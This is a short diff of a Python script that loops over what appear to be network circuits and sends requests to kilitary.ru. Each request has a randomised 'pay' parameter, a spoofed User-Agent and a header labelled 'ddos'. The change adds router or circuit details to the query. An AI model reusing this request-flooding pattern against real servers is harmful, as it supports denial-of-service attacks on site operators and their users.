@@ -28,7 +28,8 @@ if __name__ == '__main__':
 							print('receiving ... ', end='')
 							recv = recv_all(stream)
 							print(f'{len(recv)} bytes \r\n\r\n{recv.decode()[:4096]}')
-					data = do_request('http://kilitary.ru?pay=' + str(random.randint(0, 99999999)), headers={'User-Agent': 'Mozilla/6.0', 'X-use': 'ddos'}, verbose=1, retries=3)
+					data = do_request('http://kilitary.ru?pay=' + str(random.randint(0, 99999999)) + f"&push='routers:{num_circuit}'",
+					                  headers={'User-Agent': 'Mozilla/6.0', 'X-use': 'ddos'}, verbose=1, retries=3)
 					print(f'data {data[0:14096]}')
 				except Exception as e:
 					print(f"circuit: {e}")
